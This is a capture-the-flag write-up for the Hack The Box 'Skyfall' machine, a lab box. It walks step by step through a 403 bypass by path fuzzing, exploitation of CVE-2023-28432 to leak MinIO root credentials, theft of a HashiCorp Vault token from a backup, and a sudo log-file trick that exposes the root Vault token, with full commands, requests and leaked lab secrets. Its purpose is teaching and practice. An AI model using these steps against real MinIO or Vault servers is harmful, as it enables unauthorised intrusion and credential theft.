# HTB - Skyfall

### TL;DR
This is an Ubuntu 22.04.3 LTS machine which provides a MinIO-based cloud storage service. The MinIO root credentials are disclosed using 403 bypass technique and exploiting CVE-2023-28432. Once we have access to the MinIO storage we can download a file system backup which contains an HashiCorp Vault token. This will be used to get a one-time SSH password which will provide us a shell to get the user flag. Escalation is obtained by enumerating the `sudoers` configuration with `sudo -l` and abusing a rule which allows the low-priv user to unseal the HashiCorp Vault without a password.<br>

### KEYWORDS
MinIO, 403 bypass, CVE-2023-28432, HashiCorp Vault, `sudo` privileges.

### REFERENCES
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses#path-fuzzing<br>
https://www.cvedetails.com/cve/CVE-2023-28432<br>
https://min.io/docs/minio/linux/reference/minio-mc.html<br>
https://developer.hashicorp.com/vault<br>
https://developer.hashicorp.com/vault/api-docs/secret/ssh<br>
https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords<br>

### ENUMERATION
Launch a port scan with `nmap`
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-04 06:24 EST
Nmap scan report for 10.10.11.254
Host is up, received user-set (0.080s latency).
Not shown: 55897 closed tcp ports (conn-refused), 9636 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
```
Fuzz for subdomains.
```markdown
> nmap $target -p22,80 -sV -sC -Pn -vv
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-04 06:24 EST
Nmap scan report for 10.10.11.254
Host is up, received user-set (0.084s latency).
Scanned at 2024-02-04 06:24:57 EST for 9s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6570f71247073a888e27e9cb445d10fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCVqvI8vGs8EIUAAUiRze8kfKmYh9ETTUei3zRd1wWWLRBjSm+soBLfclIUP69cNtQOa961nyt2/BOwuR35cLR4=
|   256 74483307b7889d320e3bec16aab4c8fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINk0VgEkDNZoIJwcG5LEVZDZkEeSRHLBmAOtd/pduzRW
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Skyfall - Introducing Sky Storage!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
```
Enumerate the web site on port with Firefox, a login portal comes into view at http://demo.skyfall.htb/login

Try several common credentials, access is granted with `guest:guest`, and a dashboard comes into view.

![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/f0b096e6-4cca-4c8f-b0b1-b570a335da29)

If we continue to enumerate the site with firefox, we make to following findings:
- A possible SSRF point in the "URL fetch" tab at: http://demo.skyfall.htb/fetch
- A possible point for malicious file upload in the "Files" tab at: http://demo.skyfall.htb/files
- A 403 forbidden status in the "MinIO Metrics" tab at: http://demo.skyfall.htb/metrics

At this point, having found several points of entry, we can consider the enumeration phase finished and start the exploitation.

### USER
Investigate ways to bypass the MinIO metrics 403 code here:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses#path-fuzzing<br>
<br>
Following the indicated procedure for path fuzzing, first download an unicode wordlist from here: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Unicode.txt<br>
<br>
Trim the file to remove duplicate characters, resulting in a list of 1024 characters.
```markdwon
> cat Unicode.txt | sed 's/.\{3\}$//' | sort -u > unicode

> head unicode
%00
%01
%02
%03
%04
%05
%06
%07
%08
%09
```
Prepare a `request.txt` file for fuzzing the "MinIO metrics" URI.
```markdown
GET /metricsFUZZ HTTP/1.1
Host: demo.skyfall.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://demo.skyfall.htb/index
Cookie: session=.eJwljjluwzAQAP_C2oX2oHbXnxHIPZDAQAJIdmX47yGQcqaZebejzry-2v15vvLWju9o96akmGOTkR6AyYkqtc1erBCmCbiJUHhwOu1MGrBPndY5S0uqyFwqBQsGmcmU7sS9yJ2mqltYzYTwlUHoHsS8Q2g5yBgQbY28rjz_b2ChX2cdz99H_iyRw5AmEuAgQQOJ2TE6ZcS-HLhtxDW5ff4AXpdAHQ.Zb-FEQ.bpLEM3a2Qu1y5hlGYx5dx68sXho
Upgrade-Insecure-Requests: 1
```
Fuzz the URI with `ffuf` to discover an unicode to bypass the 403 status.
```markdown
> ffuf -c -request request.txt -request-proto http -t 100 -fc 403 -w ./unicode    

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://demo.skyfall.htb/metricsFUZZ
 :: Wordlist         : FUZZ: /home/kali/htb/skyfall/unicode
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: close
 :: Header           : Host: demo.skyfall.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Referer: http://demo.skyfall.htb/index
 :: Header           : Cookie: session=.eJwljjluwzAQAP_C2oX2oHbXnxHIPZDAQAJIdmX47yGQcqaZebejzry-2v15vvLWju9o96akmGOTkR6AyYkqtc1erBCmCbiJUHhwOu1MGrBPndY5S0uqyFwqBQsGmcmU7sS9yJ2mqltYzYTwlUHoHsS8Q2g5yBgQbY28rjz_b2ChX2cdz99H_iyRw5AmEuAgQQOJ2TE6ZcS-HLhtxDW5ff4AXpdAHQ.Zb-FEQ.bpLEM3a2Qu1y5hlGYx5dx68sXho
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

%0a                     [Status: 200, Size: 157902, Words: 114629, Lines: 2365, Duration: 201ms]
:: Progress: [256/256] :: Job [1/1] :: 62 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```
So the unicode character `%0A` will allow us to bypass the 403 status. Entering the URI: http://demo.skyfall.htb/metrics%0a we reach a site with the server metrics and lots of server-related info.

![Untitled002](https://github.com/g1vi/AllTheWriteUps/assets/120142960/2cdb803c-3e3b-478a-b760-cdc466d0ac40)

This also includes the path of the production endpoint, which is running at: http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster. Entering this URL in Firefox displays additional information.

![Untitled003](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b238bf71-a0ef-42ff-a7a6-60b93d2e7f83)

Now we know we are dealing with a MinIO server. Searching for MinIO vulnerabilities we come across this one: https://www.cvedetails.com/cve/CVE-2023-28432<br>
<br>
To exploit this vulnerability, browse http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify with Firefox and capture the traffic. A message is received "All access to this resource has been disabled". Send to repeater and change the method to POST, the application leaks the MinIO root user and password, just as stated in the CVE.<br>
<br>

![Untitled004](https://github.com/g1vi/AllTheWriteUps/assets/120142960/0365859b-7e9f-44cc-aeec-16784e4bb9b4)

Looking at the MinIO documentation (https://min.io/docs/minio/linux/reference/minio-mc.html), it seems we can use a binary called `mc` to interact with the server from the command line.<br>
<br>
Install the tool following the procedure depicted in the documentation.
```markdown
> curl https://dl.min.io/client/mc/release/linux-amd64/mc \
  --create-dirs \
  -o $HOME/minio-binaries/mc
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 25.6M  100 25.6M    0     0  1061k      0  0:00:24  0:00:24 --:--:-- 1154k

> chmod +x $HOME/minio-binaries/mc

> export PATH=$PATH:$HOME/minio-binaries/

> mc --help 

NAME:                                                                           
  mc - MinIO Client for object storage and filesystems.                         
                                                                                
USAGE:                                                                          
  mc [FLAGS] COMMAND [COMMAND FLAGS | -h] [ARGUMENTS...]                        
                                                                                
COMMANDS:                                                                       
  alias      manage server credentials in configuration file                    
  admin      manage MinIO servers                                               
  anonymous  manage anonymous access to buckets and objects                     
  batch      manage batch jobs                                                  
  cp         copy objects                                                       
  cat        display object contents                                            
  diff       list differences in object name, size, and date between two buckets
  du         summarize disk usage recursively                                   
  encrypt    manage bucket encryption config                                    
  event      manage object notifications                                        
  find       search for objects                                                 
  head       display first 'n' lines of an object                               
  ilm        manage bucket lifecycle                                            
  idp        manage MinIO IDentity Provider server configuration                
  license    license related commands                                           
  legalhold  manage legal hold for object(s)                                    
  ls         list buckets and objects                                           
  mb         make a bucket                                                      
  mv         move objects                                                       
  mirror     synchronize object(s) to a remote site                             
  od         measure single stream upload and download                          
  ping       perform liveness check                                             
  pipe       stream STDIN to an object                                          
```
Configure the client to use with the disclosed root MinIO and password.
```markdown
> mc alias set myminio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
mc: Configuration written to `/home/kali/.mc/config.json`. Please update your access credentials.
mc: Successfully created `/home/kali/.mc/share`.
mc: Initialized share uploads `/home/kali/.mc/share/uploads.json` file.
mc: Initialized share downloads `/home/kali/.mc/share/downloads.json` file.
Added `myminio` successfully.
```
Now we can use the client to dump MinIO info.
```markdown
> mc admin info myminio
●  minio-node1:9000
   Uptime: 2 hours 
   Version: 2023-03-13T19:46:17Z
   Network: 2/2 OK 
   Drives: 2/2 OK 
   Pool: 1

●  minio-node2:9000
   Uptime: 2 hours 
   Version: 2023-03-13T19:46:17Z
   Network: 2/2 OK 
   Drives: 2/2 OK 
   Pool: 1

Pools:
   1st, Erasure sets: 1, Drives per erasure set: 4

1.6 MiB Used, 8 Buckets, 11 Objects, 4 Versions
4 drives online, 0 drives offline
```
List the buckets and objects.
```markdown
> mc ls --recursive --versions myminio 
[2023-11-07 23:59:15 EST]     0B askyy/
[2023-11-08 00:35:28 EST]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
[2023-11-09 16:37:25 EST] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
[2023-11-09 16:37:09 EST] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
[2023-11-09 16:36:30 EST] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
[2023-11-07 23:58:56 EST]     0B btanner/
[2023-11-08 00:35:36 EST]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
[2023-11-07 23:58:33 EST]     0B emoneypenny/
[2023-11-08 00:35:56 EST]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
[2023-11-07 23:58:22 EST]     0B gmallory/
[2023-11-08 00:36:02 EST]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
[2023-11-07 19:08:01 EST]     0B guest/
[2023-11-07 19:08:05 EST]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
[2024-02-04 07:51:34 EST]   325B STANDARD null v1 PUT guest/etc_passwd
[2024-02-04 07:59:44 EST] 2.6KiB STANDARD null v1 PUT guest/test
[2023-11-07 23:59:05 EST]     0B jbond/
[2023-11-08 00:35:45 EST]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
[2023-11-07 23:58:10 EST]     0B omansfield/
[2023-11-08 00:36:09 EST]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
[2023-11-07 23:58:45 EST]     0B rsilva/
[2023-11-08 00:35:51 EST]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf
```
Here you can notice also a list of potential usernames.
```markdown
askyy
btanner
emoneypenny
gmallory
guest
jbond
omansfield
rsilva
```
Let's download the `home_backup` files and inspect the contents.
```markdown
> mc cp --vid 3c498578-8dfe-43b7-b679-32a3fe42018f myminio/askyy/home_backup.tar.gz ./home_backup.v3.tar.gz
...home_backup.tar.gz: 1.18 MiB / 1.18 MiB ━━━━━━━━━━━━━━━━━━━━━━━━ 796.65 KiB/s 1s

> mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz ./home_backup.v2.tar.gz
...home_backup.tar.gz: 2.64 KiB / 2.64 KiB ━━━━━━━━━━━━━━━━━━━━━━━━ 7.21 KiB/s 0s

> mc cp --vid 25835695-5e73-4c13-82f7-30fd2da2cf61 myminio/askyy/home_backup.tar.gz ./home_backup.v1.tar.gz
...home_backup.tar.gz: 2.48 KiB / 2.48 KiB ━━━━━━━━━━━━━━━━━━━━━━━━ 6.29 KiB/s 0s
```
Unpack and inspect the contents of the V2 file `home_backup.v2.tar.gz --vid 2b75346d-2a47-4203-ab09-3c9f878466b8`, there is a `.bashrc` configuration file with an API address and an access token for an HashCorp Vault running on the host.
```markdown
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
```
Vault is an engine to securely store passwords, certificates, encryption keys, etc. (https://developer.hashicorp.com/vault).<br>
<br>
Having disclosed the API address and the token, we are in a position to get access to the secrets stored in the Vault, including SSH secrets and one-time passwords (OTP), as indicated in the SSH part of the documentation: https://developer.hashicorp.com/vault/api-docs/secret/ssh<br>
<br>
Vault creates an OTP for each SSH authentication attempt instead of keeping a fixed password for each user. Every time a client wants to SSH into the host, he needs to request an OTP from the Vault server which is only valid for that particular SSH login. In order to supply the OTP, the server needs username/password or a token. We do not have user credentials, but we have obtained the token from the `.bashrc` file.<br>
<br>
Following Vault documentation, first we enumerate OTP roles present in the host. We can do it using `curl`
```markdown
> curl -s -H "X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE" -X LIST http://prd23-vault-internal.skyfall.htb/v1/ssh/roles | jq 
{
  "request_id": "d69fb2c5-11ad-cc2f-df08-341044fade07",
  "lease_id": "",
  "renewable": false,
  "lease_duration": 0,
  "data": {
    "key_info": {
      "admin_otp_key_role": {
        "key_type": "otp"
      },
      "dev_otp_key_role": {
        "key_type": "otp"
      }
    },
    "keys": [
      "admin_otp_key_role",
      "dev_otp_key_role"
    ]
  },
  "wrap_info": null,
  "warnings": null,
  "auth": null
}
```
Or from command line using the `vault` binary (download from https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip and unzip). For this, we need to export `env` variables first, then request the Vault roles.
```markdwn
> export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"

> export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"

> ./vault token capabilities ssh/roles
list

> ./vault list ssh/roles
Keys
----
admin_otp_key_role
dev_otp_key_role
```
Next, request a key for `dev_otp_key_role` using the token (the token is not valid for getting a key for `admin_otp_key_role`).
```markdown
> curl -s -X POST -H "X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE" http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role --data '{ "ip": "10.10.11.254" }' | jq
{
  "request_id": "f7a109ef-42b8-5e8e-9ec4-8ef421fc9ecc",
  "lease_id": "ssh/creds/dev_otp_key_role/849HoIpC4J5LwjyyrUuwPBYV",
  "renewable": false,
  "lease_duration": 2764800,
  "data": {
    "ip": "10.10.11.254",
    "key": "13a7122b-3345-7e5b-da9c-832f1901b687",
    "key_type": "otp",
    "port": 22,
    "username": "nobody"
  },
  "wrap_info": null,
  "warnings": null,
  "auth": null
}
```
Or with the `vault` command line binary.
```markdwon
> ./vault write ssh/creds/dev_otp_key_role ip=10.10.11.254
Key                Value
---                -----
lease_id           ssh/creds/dev_otp_key_role/3wePhQCE63bptOYaVseHqvJl
lease_duration     768h
lease_renewable    false
ip                 10.10.11.254
key                ecc91958-6ca4-58d3-273d-f8bb82b76717
key_type           otp
port               22
username           nobody
```
The key provided is the OTP password for the SSH session. Notice the OTP expires very soon. As indicated in the API docuemntation, the token status can be checked by querying the OTP key against the endpoint `/ssh/verify`<br>
<br>
In the documentation (https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords) there is a way to automatize the process to request a key and immediately SSH into the host (had to install the `sshpass` package first), so you make sure the token does not expire between the two steps.<br>
<br>
Also, note the user `nobody` is not actually a system user. If you try with the list of potential usernames disclosed before, you'll find user `askyy` is a valid username for SSH login.<br>
<br>
Bearing all this in mind, the command to get an SSH session for user `askyy` is the following.
```markdown
> ./vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking=no askyy@10.10.11.254
```
Which is valid to get the user flag.

### ROOT
Start from an SSH session for user `askyy`
```markdown
> export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"

> export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"

> ./vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking=no askyy@10.10.11.254
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
askyy@skyfall:~$
```
Take the opportunity to enumerate the system.
```markdown
> uname -a && cat /etc/os-release
Linux skyfall 5.15.0-92-generic #102-Ubuntu SMP Wed Jan 10 09:33:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```
And the current user.
```markdown
> whoami && id
askyy
uid=1000(askyy) gid=1000(askyy) groups=1000(askyy)
```
Check if `askyy` is a sudoer.
```markdown
> sudo -l
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml [-vhd]*
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```
It seems `askyy` is allowed to unseal the vault as root, no password will be prompted. Check `unseal` command help for options available.
```markdown
> sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
Usage:
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message
```
So, according to `sudo -l` we can unseal the vault as root using the `vault-unseal` with verbose (option `-v`), debug (`-d`) or using a config file (`-c /etc/vault-unseal.yaml`).<br>
<br>
Let's try to unseal the vault in verbose mode.
```markdown
> sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[-] Master token found in config: ****************************
[>] Enable 'debug' mode for details
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
```
The application dumps the master key and says more info will be provided in debug mode. Let's repeat repeat in debug mode (option `-d`).
```markdown
> sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false

> ls -hal
total 36K
drwxr-x--- 4 askyy askyy 4.0K Feb  5 10:58 .
drwxr-xr-x 3 root  root  4.0K Jan 19 21:33 ..
lrwxrwxrwx 1 askyy askyy    9 Nov  9 21:30 .bash_history -> /dev/null
-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 askyy askyy 3.7K Nov  9 21:30 .bashrc
drwx------ 2 askyy askyy 4.0K Oct  9 18:47 .cache
-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
drwx------ 2 askyy askyy 4.0K Jan 18 10:32 .ssh
-rw------- 1 root  root   590 Feb  5 10:58 debug.log
-rw-r----- 1 root  askyy   33 Feb  5 09:01 user.txt

>cat debug.log 
cat: debug.log: Permission denied
```
The debug info is stored in a log file called `debug.log`, but since it is created under the root context (`sudo`) we cannot read it.<br>
<br>
However, if we run the command again the new results will be appended into any existing debug file.
```markdown
> sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false

> ls -hal
total 36K
drwxr-x--- 4 askyy askyy 4.0K Feb  5 10:58 .
drwxr-xr-x 3 root  root  4.0K Jan 19 21:33 ..
lrwxrwxrwx 1 askyy askyy    9 Nov  9 21:30 .bash_history -> /dev/null
-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 askyy askyy 3.7K Nov  9 21:30 .bashrc
drwx------ 2 askyy askyy 4.0K Oct  9 18:47 .cache
-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
drwx------ 2 askyy askyy 4.0K Jan 18 10:32 .ssh
-rw------- 1 root  root  1.2K Feb  5 11:00 debug.log
-rw-r----- 1 root  askyy   33 Feb  5 09:01 user.txt
```
Notice the `debug.log` file size has increased from 590 bytes to 1.2 KB, meaning the results have been appended to the existing log.<br>
<br>
Delete the existing `debug.log` file and create a new one with `touch`, so it is owned by `askyy`
```markdown
> rm debug.log 
rm: remove write-protected regular file 'debug.log'? Y

> touch debug.log

> ls -hal
total 32K
drwxr-x--- 4 askyy askyy 4.0K Feb  5 11:02 .
drwxr-xr-x 3 root  root  4.0K Jan 19 21:33 ..
lrwxrwxrwx 1 askyy askyy    9 Nov  9 21:30 .bash_history -> /dev/null
-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 askyy askyy 3.7K Nov  9 21:30 .bashrc
drwx------ 2 askyy askyy 4.0K Oct  9 18:47 .cache
-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
drwx------ 2 askyy askyy 4.0K Jan 18 10:32 .ssh
-rw-rw-r-- 1 askyy askyy    0 Feb  5 11:02 debug.log
-rw-r----- 1 root  askyy   33 Feb  5 09:01 user.txt
```
Unseal again, this time we are able to read the file `debug log` since it is appended to the existing one (owned by `askyy`).
```markdown
> sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false

> ls -hal
total 36K
drwxr-x--- 4 askyy askyy 4.0K Feb  5 11:02 .
drwxr-xr-x 3 root  root  4.0K Jan 19 21:33 ..
lrwxrwxrwx 1 askyy askyy    9 Nov  9 21:30 .bash_history -> /dev/null
-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 askyy askyy 3.7K Nov  9 21:30 .bashrc
drwx------ 2 askyy askyy 4.0K Oct  9 18:47 .cache
-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
drwx------ 2 askyy askyy 4.0K Jan 18 10:32 .ssh
-rw-rw-r-- 1 askyy askyy  590 Feb  5 11:02 debug.log
-rw-r----- 1 root  askyy   33 Feb  5 09:01 user.txt

> cat debug.log
2024/02/05 11:02:44 Initializing logger...
2024/02/05 11:02:44 Reading: /etc/vault-unseal.yaml
2024/02/05 11:02:44 Security Risk!
2024/02/05 11:02:44 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
2024/02/05 11:02:44 Found Vault node: http://prd23-vault-internal.skyfall.htb
2024/02/05 11:02:44 Check interval: 5s
2024/02/05 11:02:44 Max checks: 5
2024/02/05 11:02:44 Establishing connection to Vault...
2024/02/05 11:02:44 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2024/02/05 11:02:44 Checking seal status
2024/02/05 11:02:44 Vault sealed: false
```
Application dumps the vault master key, which we can use to generate an OTP and SSH in the same way as before. Just remember to update the role to `admin_otp_key_role`, and SSH as `root`
```markdown
> export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"

> export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"

> ./vault ssh -role admin_otp_key_role -mode otp -strict-host-key-checking=no root@10.10.11.254
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@skyfall:~# id
uid=0(root) gid=0(root) groups=0(root)
```
You are root.
